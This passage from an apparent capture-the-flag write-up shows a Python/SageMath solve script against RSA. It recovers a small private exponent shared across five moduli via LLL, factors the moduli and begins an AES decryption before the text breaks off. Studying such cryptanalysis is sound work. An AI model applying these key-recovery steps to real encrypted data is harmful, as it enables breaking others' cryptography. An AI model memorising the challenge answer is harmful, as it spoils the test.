+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>e4</span> <span class=o>=</span> <span class=mi>1003585299728442138241618739786172474341836074346983356412903232651178484164007865852681323340512406956827176253325249434459143223478630158795320316445722303141000749369087588146876087005139101967705654538148200848735795226715484701026716263131990473014248826031226350016169675911701420383849573743077161936130739955632072650333006768068396767746102320645544271946493533626477749495460960365939362830334782483616521427745117179433129272929291131199903349977861093</span>
+</span></span><span class=line><span class=cl><span class=n>e3</span> <span class=o>=</span> <span class=mi>528794486797786998573050589647661205854628331390578568482905276781799068613879068393786314280307765489986817827366340249545226369795434498075653554440390174127680889163962386407937584138342055553885382937486807537913781141805602397908008361192107987266566035872632130183102501118938531330140154852996630732644530954025739132771439783366022539476194754352734861357158197716623228211860189868592877935421689151152269864018399507621324672725433395533000425391708101</span>
+</span></span><span class=line><span class=cl><span class=n>e2</span> <span class=o>=</span> <span class=mi>120373323462979513980656435521004077312964483601298713849302793507801996545855844801219890178210569842943901523332883574699699439655256681068585396438543716728771762620808023696864023456625376138578749985774885652016790204471223404504866831356254849552890279653807176865165230965065842479979722094076544915080001416276324550993965426099480075249719779502220020343237480355441663501565965298776708377675024327374331823503627493136287447543537154779812201209689733</span>
+</span></span><span class=line><span class=cl><span class=n>e1</span> <span class=o>=</span> <span class=mi>63082374875671578481986217433413118060930080658278695174993640397998104913203950822096713822227514918774669078130439943184022889683633824002111416144422250644695809731240622289790840695469043596475009958463780096705571401137513331089894183226911665633164170027318352120002851940432163291498705806239158684141492080194438572549164494596965748695244152843943149994989589419519395650481254722496058552304954140980743159877918387972030837603120258130045817858729621</span>
+</span></span><span class=line><span class=cl><span class=n>e0</span> <span class=o>=</span> <span class=mi>271264973728317298627822473902975461834475616151421882685140849409171660245987005602120200976835072966082573357282000859946014645129524701781302678299643424924092704444611429422064341444927220441684375194952864825982915148126084102832224731498348832396834993134927447743362540828447462072582023959357845229307404791804881057335208287771899121154533179273274029972648764343120454360366227609296867085751393693129946684282269737380796082741762647814800935844443493</span>
+</span></span><span class=line><span class=cl><span class=n>n4</span> <span class=o>=</span> <span class=mi>1905432596115201099512716986634374621489368222604315919606798930577721863294916275385323430940054377575273762764157350871093106918016952598143825002497857813393515175754983371150373414986745909170502391681896252141058196242286758315439213464335711981585004206505072743627148478873299089587473670712150938286701206231734068594554186483978059254161949801153805752489828395472590106405761648181381945795038085612905557546907903561767813822101495476457137965288880829</span>
+</span></span><span class=line><span class=cl><span class=n>n3</span> <span class=o>=</span> <span class=mi>1364349980724204783960363890369037262456777329397270902364257972605993939460160766530889520645888701966401869980072151818996346007664249855901114579605632358191242379651843548926065735575249122023543206153088606751338328933651430885645444839242513718915066302971957689904414300766000572990594260836480347717506097403302570129593533017205416936506156113683938133811098995666977893386015199252455279325252257306124895958614122639652100229863446635612470942945471629</span>
+</span></span><span class=line><span class=cl><span class=n>n2</span> <span class=o>=</span> <span class=mi>966507016385573035667733231340091844033410158675175976938028218854439065352997895173668326599042719776214706325758565722305289931861889759808022284179479582700755314576250841330755684569639628012527976286442288571350327307582007959428925460653350857512795573323486273071975979456828134582982048746188934676698845075430701350305713747666370252912970653968385390246217234899448990236850880873105998296512557366752267827688836849041157572772272378435636367162425013</span>
+</span></span><span class=line><span class=cl><span class=n>n1</span> <span class=o>=</span> <span class=mi>801368910415539931617837996119032301790585643652894417707002521182569449104238101253556548156062846942011258499343192564944616333555000780965111384091131074358231330717413121484815002612991437436336271715078003900216545055505405363415778086330672269759661284535787363323398929120499505051378299467980018690275341014026390376705451595348674549031968858607633947674244014656615045639930798213161815130251215148286379903187335369475976106390101774566278602818405563</span>
+</span></span><span class=line><span class=cl><span class=n>n0</span> <span class=o>=</span> <span class=mi>729626364576206469704240917876675932841677846807662743683194531189219993605123671836962855605283722577718230552963049472251011326675202612492908848548419883361685662678347011887752523869081347313358470192291106167923273619672010347904232948623232956703976722596246251219832472749781700661621717970912452690860710243752051416797956410009096107757901714990018414837758557784033898837218196380413347278999394220278929595840196278059116531409774355756772349502091527</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>n4</span> <span class=o>**</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>iroot</span><span class=p>(</span><span class=n>t</span><span class=p>,</span> <span class=mi>3</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>M</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=p>[[</span><span class=n>M</span><span class=p>,</span> <span class=n>e0</span><span class=p>,</span> <span class=n>e1</span><span class=p>,</span> <span class=n>e2</span><span class=p>,</span> <span class=n>e3</span><span class=p>,</span> <span class=n>e4</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n3</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span> 
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n4</span><span class=p>]])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=p>(</span><span class=n>L</span><span class=o>.</span><span class=n>LLL</span><span class=p>()[</span><span class=mi>2</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span><span class=o>//</span> <span class=n>M</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1>#79707249059210800427586261608616662408613108106616463837006013556788454508274558925787023296092333364088239266520329780878389357</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>d</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后就是已知e，d，n分解n了，套板子梭哈</p><p>完整exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>e4</span> <span class=o>=</span> <span class=mi>1003585299728442138241618739786172474341836074346983356412903232651178484164007865852681323340512406956827176253325249434459143223478630158795320316445722303141000749369087588146876087005139101967705654538148200848735795226715484701026716263131990473014248826031226350016169675911701420383849573743077161936130739955632072650333006768068396767746102320645544271946493533626477749495460960365939362830334782483616521427745117179433129272929291131199903349977861093</span>
+</span></span><span class=line><span class=cl><span class=n>e3</span> <span class=o>=</span> <span class=mi>528794486797786998573050589647661205854628331390578568482905276781799068613879068393786314280307765489986817827366340249545226369795434498075653554440390174127680889163962386407937584138342055553885382937486807537913781141805602397908008361192107987266566035872632130183102501118938531330140154852996630732644530954025739132771439783366022539476194754352734861357158197716623228211860189868592877935421689151152269864018399507621324672725433395533000425391708101</span>
+</span></span><span class=line><span class=cl><span class=n>e2</span> <span class=o>=</span> <span class=mi>120373323462979513980656435521004077312964483601298713849302793507801996545855844801219890178210569842943901523332883574699699439655256681068585396438543716728771762620808023696864023456625376138578749985774885652016790204471223404504866831356254849552890279653807176865165230965065842479979722094076544915080001416276324550993965426099480075249719779502220020343237480355441663501565965298776708377675024327374331823503627493136287447543537154779812201209689733</span>
+</span></span><span class=line><span class=cl><span class=n>e1</span> <span class=o>=</span> <span class=mi>63082374875671578481986217433413118060930080658278695174993640397998104913203950822096713822227514918774669078130439943184022889683633824002111416144422250644695809731240622289790840695469043596475009958463780096705571401137513331089894183226911665633164170027318352120002851940432163291498705806239158684141492080194438572549164494596965748695244152843943149994989589419519395650481254722496058552304954140980743159877918387972030837603120258130045817858729621</span>
+</span></span><span class=line><span class=cl><span class=n>e0</span> <span class=o>=</span> <span class=mi>271264973728317298627822473902975461834475616151421882685140849409171660245987005602120200976835072966082573357282000859946014645129524701781302678299643424924092704444611429422064341444927220441684375194952864825982915148126084102832224731498348832396834993134927447743362540828447462072582023959357845229307404791804881057335208287771899121154533179273274029972648764343120454360366227609296867085751393693129946684282269737380796082741762647814800935844443493</span>
+</span></span><span class=line><span class=cl><span class=n>n4</span> <span class=o>=</span> <span class=mi>1905432596115201099512716986634374621489368222604315919606798930577721863294916275385323430940054377575273762764157350871093106918016952598143825002497857813393515175754983371150373414986745909170502391681896252141058196242286758315439213464335711981585004206505072743627148478873299089587473670712150938286701206231734068594554186483978059254161949801153805752489828395472590106405761648181381945795038085612905557546907903561767813822101495476457137965288880829</span>
+</span></span><span class=line><span class=cl><span class=n>n3</span> <span class=o>=</span> <span class=mi>1364349980724204783960363890369037262456777329397270902364257972605993939460160766530889520645888701966401869980072151818996346007664249855901114579605632358191242379651843548926065735575249122023543206153088606751338328933651430885645444839242513718915066302971957689904414300766000572990594260836480347717506097403302570129593533017205416936506156113683938133811098995666977893386015199252455279325252257306124895958614122639652100229863446635612470942945471629</span>
+</span></span><span class=line><span class=cl><span class=n>n2</span> <span class=o>=</span> <span class=mi>966507016385573035667733231340091844033410158675175976938028218854439065352997895173668326599042719776214706325758565722305289931861889759808022284179479582700755314576250841330755684569639628012527976286442288571350327307582007959428925460653350857512795573323486273071975979456828134582982048746188934676698845075430701350305713747666370252912970653968385390246217234899448990236850880873105998296512557366752267827688836849041157572772272378435636367162425013</span>
+</span></span><span class=line><span class=cl><span class=n>n1</span> <span class=o>=</span> <span class=mi>801368910415539931617837996119032301790585643652894417707002521182569449104238101253556548156062846942011258499343192564944616333555000780965111384091131074358231330717413121484815002612991437436336271715078003900216545055505405363415778086330672269759661284535787363323398929120499505051378299467980018690275341014026390376705451595348674549031968858607633947674244014656615045639930798213161815130251215148286379903187335369475976106390101774566278602818405563</span>
+</span></span><span class=line><span class=cl><span class=n>n0</span> <span class=o>=</span> <span class=mi>729626364576206469704240917876675932841677846807662743683194531189219993605123671836962855605283722577718230552963049472251011326675202612492908848548419883361685662678347011887752523869081347313358470192291106167923273619672010347904232948623232956703976722596246251219832472749781700661621717970912452690860710243752051416797956410009096107757901714990018414837758557784033898837218196380413347278999394220278929595840196278059116531409774355756772349502091527</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>n4</span> <span class=o>**</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>iroot</span><span class=p>(</span><span class=n>t</span><span class=p>,</span> <span class=mi>3</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>M</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=p>[[</span><span class=n>M</span><span class=p>,</span> <span class=n>e0</span><span class=p>,</span> <span class=n>e1</span><span class=p>,</span> <span class=n>e2</span><span class=p>,</span> <span class=n>e3</span><span class=p>,</span> <span class=n>e4</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n3</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span> 
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n4</span><span class=p>]])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=p>(</span><span class=n>L</span><span class=o>.</span><span class=n>LLL</span><span class=p>()[</span><span class=mi>2</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span><span class=o>//</span> <span class=n>M</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1>#79707249059210800427586261608616662408613108106616463837006013556788454508274558925787023296092333364088239266520329780878389357</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>d</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>GCD</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Hash</span> <span class=kn>import</span> <span class=n>SHA3_512</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>unpad</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_one_factor</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>d</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>e</span> <span class=o>*</span> <span class=n>d</span> <span class=o>-</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>m</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>t</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>//=</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>n</span> <span class=o>-</span> <span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>v</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>t</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>v</span> <span class=o>==</span> <span class=mi>1</span> <span class=ow>or</span> <span class=n>v</span> <span class=o>==</span> <span class=n>n</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=n>v_prev</span> <span class=o>=</span> <span class=n>v</span>
+</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=n>v</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>v_prev</span> <span class=o>=</span> <span class=n>v</span>
+</span></span><span class=line><span class=cl>            <span class=n>v</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>v</span> <span class=o>==</span> <span class=n>n</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>  
+</span></span><span class=line><span class=cl>            
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>v</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=n>factor</span> <span class=o>=</span> <span class=n>GCD</span><span class=p>(</span><span class=n>v_prev</span> <span class=o>-</span> <span class=mi>1</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>factor</span> <span class=o>!=</span> <span class=mi>1</span> <span class=ow>and</span> <span class=n>factor</span> <span class=o>!=</span> <span class=n>n</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>factor</span> 
+</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span> 
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>find_all_factors</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>d</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>factors_found</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>solve</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>num</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span>
+</span></span><span class=line><span class=cl>        <span class=n>f</span> <span class=o>=</span> <span class=n>get_one_factor</span><span class=p>(</span><span class=n>num</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>d</span><span class=p>)</span>     
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>f</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>factors_found</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span>
+</span></span><span class=line><span class=cl>        <span class=n>solve</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>solve</span><span class=p>(</span><span class=n>num</span> <span class=o>//</span> <span class=n>f</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>factors_found</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ns</span> <span class=o>=</span> <span class=p>[</span><span class=mi>729626364576206469704240917876675932841677846807662743683194531189219993605123671836962855605283722577718230552963049472251011326675202612492908848548419883361685662678347011887752523869081347313358470192291106167923273619672010347904232948623232956703976722596246251219832472749781700661621717970912452690860710243752051416797956410009096107757901714990018414837758557784033898837218196380413347278999394220278929595840196278059116531409774355756772349502091527</span><span class=p>,</span> <span class=mi>1905432596115201099512716986634374621489368222604315919606798930577721863294916275385323430940054377575273762764157350871093106918016952598143825002497857813393515175754983371150373414986745909170502391681896252141058196242286758315439213464335711981585004206505072743627148478873299089587473670712150938286701206231734068594554186483978059254161949801153805752489828395472590106405761648181381945795038085612905557546907903561767813822101495476457137965288880829</span><span class=p>,</span> <span class=mi>1364349980724204783960363890369037262456777329397270902364257972605993939460160766530889520645888701966401869980072151818996346007664249855901114579605632358191242379651843548926065735575249122023543206153088606751338328933651430885645444839242513718915066302971957689904414300766000572990594260836480347717506097403302570129593533017205416936506156113683938133811098995666977893386015199252455279325252257306124895958614122639652100229863446635612470942945471629</span><span class=p>,</span> <span class=mi>801368910415539931617837996119032301790585643652894417707002521182569449104238101253556548156062846942011258499343192564944616333555000780965111384091131074358231330717413121484815002612991437436336271715078003900216545055505405363415778086330672269759661284535787363323398929120499505051378299467980018690275341014026390376705451595348674549031968858607633947674244014656615045639930798213161815130251215148286379903187335369475976106390101774566278602818405563</span><span class=p>,</span> <span class=mi>966507016385573035667733231340091844033410158675175976938028218854439065352997895173668326599042719776214706325758565722305289931861889759808022284179479582700755314576250841330755684569639628012527976286442288571350327307582007959428925460653350857512795573323486273071975979456828134582982048746188934676698845075430701350305713747666370252912970653968385390246217234899448990236850880873105998296512557366752267827688836849041157572772272378435636367162425013</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>es</span> <span class=o>=</span> <span class=p>[</span><span class=mi>271264973728317298627822473902975461834475616151421882685140849409171660245987005602120200976835072966082573357282000859946014645129524701781302678299643424924092704444611429422064341444927220441684375194952864825982915148126084102832224731498348832396834993134927447743362540828447462072582023959357845229307404791804881057335208287771899121154533179273274029972648764343120454360366227609296867085751393693129946684282269737380796082741762647814800935844443493</span><span class=p>,</span> <span class=mi>1003585299728442138241618739786172474341836074346983356412903232651178484164007865852681323340512406956827176253325249434459143223478630158795320316445722303141000749369087588146876087005139101967705654538148200848735795226715484701026716263131990473014248826031226350016169675911701420383849573743077161936130739955632072650333006768068396767746102320645544271946493533626477749495460960365939362830334782483616521427745117179433129272929291131199903349977861093</span><span class=p>,</span> <span class=mi>528794486797786998573050589647661205854628331390578568482905276781799068613879068393786314280307765489986817827366340249545226369795434498075653554440390174127680889163962386407937584138342055553885382937486807537913781141805602397908008361192107987266566035872632130183102501118938531330140154852996630732644530954025739132771439783366022539476194754352734861357158197716623228211860189868592877935421689151152269864018399507621324672725433395533000425391708101</span><span class=p>,</span> <span class=mi>63082374875671578481986217433413118060930080658278695174993640397998104913203950822096713822227514918774669078130439943184022889683633824002111416144422250644695809731240622289790840695469043596475009958463780096705571401137513331089894183226911665633164170027318352120002851940432163291498705806239158684141492080194438572549164494596965748695244152843943149994989589419519395650481254722496058552304954140980743159877918387972030837603120258130045817858729621</span><span class=p>,</span> <span class=mi>120373323462979513980656435521004077312964483601298713849302793507801996545855844801219890178210569842943901523332883574699699439655256681068585396438543716728771762620808023696864023456625376138578749985774885652016790204471223404504866831356254849552890279653807176865165230965065842479979722094076544915080001416276324550993965426099480075249719779502220020343237480355441663501565965298776708377675024327374331823503627493136287447543537154779812201209689733</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ct</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;J</span><span class=se>\x08\x0c\xfe\x0e</span><span class=s1>C</span><span class=se>\n\x96</span><span class=s1>!</span><span class=se>\xb3\x05\xa9\x9b\xf9\n\xe3</span><span class=s1>-</span><span class=se>\xf2</span><span class=s1>m</span><span class=se>\xdb</span><span class=s1>&amp;.</span><span class=se>\xb5</span><span class=s1>h</span><span class=se>\xe1\x0e\xd6\x89\x14\x87</span><span class=s1>Z</span><span class=se>\x0b</span><span class=s1>0p</span><span class=se>\xbb\xd9\x93\xd7\x1c</span><span class=s1>T</span><span class=se>\xa2\xf3</span><span class=s1>6</span><span class=se>\x02\x8e</span><span class=s1>:</span><span class=se>\\\x92</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>total_sum_of_primes</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>all_ps_tuples</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>
